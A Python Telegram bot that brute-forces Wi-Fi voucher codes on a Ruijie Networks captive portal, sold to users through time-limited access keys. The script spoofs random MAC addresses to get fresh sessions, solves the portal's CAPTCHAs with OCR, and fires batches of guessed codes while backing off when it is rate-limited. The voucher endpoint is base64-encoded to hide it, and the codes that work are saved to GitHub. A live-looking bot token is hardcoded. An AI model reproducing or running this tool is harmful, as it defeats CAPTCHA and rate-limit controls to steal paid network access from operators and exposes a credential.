import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ==========================================
# Bot Configuration (Restored from Original)
# ==========================================
BOT_TOKEN = "8920875247:AAHowI29h7xFaDbyk9bCWXvsxIYhrk9CdVw"
ADMIN_ID = "1901101365"

# GitHub Configuration (For Render Persistence)
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
GITHUB_REPO = os.environ.get("GITHUB_REPO")

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
session = None
_connector = None
CONCURRENCY = 50 # Adjusted for Render stability
_voucher_sem = None
_start_time = time.monotonic()
_local_file_lock = asyncio.Lock()

# ==========================================
# GitHub Storage (Replaces Local File Logic)
# ==========================================
async def get_file_content(path):
    """Read JSON from GitHub instead of local disk."""
    if not GITHUB_TOKEN or not GITHUB_REPO:
        print("GitHub config missing in Environment Variables")
        return {}, None
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(url, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    content = base64.b64decode(data['content']).decode('utf-8')
                    return json.loads(content), data['sha']
                return {}, None
    except Exception as e:
        print(f"GitHub Read Error: {e}")
        return {}, None

async def update_file_content(path, content, sha, message):
    """Write JSON to GitHub instead of local disk."""
    if not GITHUB_TOKEN or not GITHUB_REPO: return "No Config"
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    payload = {
        "message": message,
        "content": base64.b64encode(json.dumps(content, indent=4, ensure_ascii=False).encode('utf-8')).decode('utf-8')
    }
    if sha: payload["sha"] = sha
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.put(url, headers=headers, json=payload) as resp:
                return "saved" if resp.status in [200, 201] else "failed"
    except Exception as e:
        print(f"GitHub Write Error: {e}")
        return "error"

# ==========================================
# Web Server (For Render 24/7)
# ==========================================
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ==========================================
# Original Bot Handlers (100% Parity)
# ==========================================

@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /key ဖြင့်စတင်ပါ။")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve
    key = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    if key == ADMIN_ID or key in auth_list:
        valid = True if key == ADMIN_ID else check_key_expiration(auth_list[key])
        if valid:
            approve[message.chat.id] = True
            user_data[message.chat.id] = {}
            await bot.reply_to(message, " ✅ Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။")
        else:
            approve[message.chat.id] = False
            await bot.reply_to(message, " ❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(message, " ⚠️ သင်၏ key ကို registered မလုပ်ရသေးပါ။")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                expires_str = "Unlimited" if expires == "9999-12-31T23:59:59Z" else expires
            else:
                plan, expires_str = "old", str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e: print(f"Error at listkeys {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage: /delkey 123456789")
            return
        user_id = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        if user_id not in auth_list:
            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        await update_file_content("auth_list.json", auth_list, sha, f"Delete key for {user_id}")
        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(message, f" ✅ Key Deleted\n\nUSER ID : {user_id}")
    except Exception as e: print(f"Error at delkey {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage: /genkey 1h 123456789")
            return
        plan, user_id = args[1], args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "Plans: 30m, 1h, 1d, 7d, 1m, 1y, unlimited")
            return
        auth_list, sha = await get_file_content("auth_list.json")
        auth_list[user_id] = {"expires_at": expiry, "plan": plan}
        await update_file_content("auth_list.json", auth_list, sha, f"Add key for {user_id}")
        await bot.reply_to(message, f" ✅ Key Generated\n\nUSER ID : {user_id}\nPLAN : {plan}\nEXPIRES : {expiry}")
    except Exception as e: print(f"Error at genkey {e}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    auth_list, _ = await get_file_content("auth_list.json")
    if str(message.chat.id) == ADMIN_ID or str(message.chat.id) in auth_list:
        results, _ = await get_file_content("result.json")
        chat_id_str = str(message.chat.id)
        if chat_id_str in results and results[chat_id_str]:
            codes = "\n".join(results[chat_id_str])
            await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
        else:
            await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို registered မပြုလုပ်ရသေးပါ။")

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z": return True
            return datetime.now(timezone.utc) < datetime.fromisoformat(expiry.replace("Z", "+00:00"))
        return False
    except: return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {"30m": timedelta(minutes=30), "1h": timedelta(hours=1), "1d": timedelta(days=1), "7d": timedelta(days=7), "1m": timedelta(days=30), "1y": timedelta(days=365), "unlimited": None}
    if plan not in plans: return None
    if plan == "unlimited": return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    auth_list, _ = await get_file_content("auth_list.json")
    if str(message.chat.id) == ADMIN_ID or str(message.chat.id) in auth_list:
        results, sha = await get_file_content("result.json")
        chat_id_str = str(message.chat.id)
        if chat_id_str in results and results[chat_id_str]:
            if "session_url" not in user_data.get(chat_id, {}):
                await bot.reply_to(message, "/recheck အတွက် /input အရင်လုပ်ပါ။")
                return
            await bot.reply_to(message, "Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
            codes = results[chat_id_str]
            recheck_list = []
            for code in codes:
                res = await perform_check(user_data[chat_id]["session_url"], code, chat_id, None, recheck=True, message=message)
                if res: recheck_list.append(res)
            to_show = "\n".join(recheck_list) if recheck_list else "ရှာမတွေ့ပါ။"
            await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
            await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")
        else: await bot.reply_to(message, "သင့်တွင် code မရှိသေးပါ။")
    else: await bot.reply_to(message, "key registered မလုပ်ရသေးပါ။")

# ==========================================
# Original Core Logic (Restored Headers & MAC)
# ==========================================

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True, ssl=False) as response:
            final_url = str(response.url)
            if "sessionId" in final_url or response.status == 200: return True
    except: return False
    return False

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /input your_session_url")
        return
    url = args[1]
    if message.chat.id in approve:
        await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
        if await check_session_url(url):
            user_data[message.chat.id]['session_url'] = url
            await bot.reply_to(message, "✅ Session URL သိမ်းပြီးပါပြီ။ /scan စတင်ပါ။")
        else: await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /scan <6, 7, 8, ascii-lower, all>")
        return
    mode, chat_id = args[1], message.chat.id
    if not approve.get(chat_id, False) or 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "⚠️ /key နှင့် /input အရင်လုပ်ပါ။")
        return
    progress_msg = await bot.send_message(chat_id, "🔍Scanning Codes...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message, progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    if chat_id in scan_tasks:
        scan_tasks[chat_id]["stop"] = True
        await bot.reply_to(message, "🛑 /scan ကို ရပ်တန့်ပြီးပါပြီ။")

async def github_update_scheduler():
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty(): items.append(await SUCCESS_CODE.get())
        if items:
            results, sha = await get_file_content("result.json")
            for item in items:
                uid, code = str(item["chat_id"]), item["code"]
                if uid not in results: results[uid] = []
                if code not in results[uid]: results[uid].append(code)
            await update_file_content("result.json", results, sha, "Periodic Update")

# ==========================================
# Original Bruteforce Logic (Restored 100%)
# ==========================================

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'referer': url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session.get(url, headers=headers, allow_redirects=True, ssl=False) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else previous_session_id
    except: return previous_session_id

async def Captcha_Image(session, sid):
    url = f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sid}&_t={time.time()}'
    async with session.get(url, ssl=False) as resp: return await resp.read()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(lambda: _ocr.classification(image_bytes).upper())

async def Varify_Captcha(session, sid, text):
    url = 'https://portal-as.ruijienetworks.com/api/auth/captcha/verify'
    async with session.post(url, json={'sessionId': sid, 'authCode': text}, ssl=False) as resp:
        data = await resp.json()
        return data.get("success")

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    for _attempt in range(3):
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as task_session:
            sid = await get_session_id(task_session, session_url, None)
            if not sid: continue
            auth_code = None
            for _ in range(8):
                try:
                    img = await Captcha_Image(task_session, sid)
                    text = await Captcha_Text(img)
                    if await Varify_Captcha(task_session, sid, text):
                        auth_code = text
                        break
                except: continue
            if not auth_code: continue
            data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth_code}
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "content-type": "application/json",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={sid}",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers, ssl=False) as req:
                    resp = await req.text()
                    if 'logonUrl' in resp:
                        if not recheck:
                            if chat_id not in success_texts: success_texts[chat_id] = []
                            success_texts[chat_id].append(code)
                            await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
                            await bot.send_message(chat_id, f"✅ Success Code Found: {code}")
                        return code
                    if 'request limited' in resp:
                        await asyncio.sleep(2)
                        continue
                    return None
            except: pass
    if not recheck: retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
    return None

def iter_codes(mode):
    if mode in ["6", "7"]:
        c = [str(i).zfill(int(mode)) for i in range(10 ** int(mode))]
        random.shuffle(c)
        yield from c
        return
    if mode == "8":
        while True: yield "".join(random.choice(string.digits) for _ in range(8))
    if mode == "ascii-lower":
        while True: yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    if mode == "all":
        while True: yield "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))

async def run_bruteforce(mode, chat_id, session_url, scan_id, message, progress_msg):
    code_iter = iter_codes(mode)
    checked, start = 0, time.monotonic()
    global _voucher_sem
    if _voucher_sem is None: _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    try:
        while not scan_tasks.get(chat_id, {}).get("stop"):
            batch = []
            for _ in range(50):
                try: batch.append(next(code_iter))
                except StopIteration: break
            if not batch: break
            await asyncio.gather(*[perform_check(session_url, c, chat_id, scan_id, message=message) for c in batch], return_exceptions=True)
            checked += len(batch)
            elapsed = time.monotonic() - start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            text = f"🔍Scanning Codes...\n\n📦Checked : {checked:,}\n⚡Speed : {speed:,.0f} codes/min\n✅Found : {found}\n🔁Retry : {retry_counts.get(chat_id, 0)}"
            try: await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except: pass
        await bot.send_message(chat_id, "🏁 Scanning Completed")
    finally: scan_tasks.pop(chat_id, None)

_ocr = ddddocr.DdddOcr(show_ad=False)

async def main():
    global _connector, session
    _connector = aiohttp.TCPConnector(limit=100, ssl=False)
    session = aiohttp.ClientSession(connector=_connector)
    asyncio.create_task(web_server())
    asyncio.create_task(github_update_scheduler())
    await bot.infinity_polling()

if __name__ == '__main__':
    asyncio.run(main())
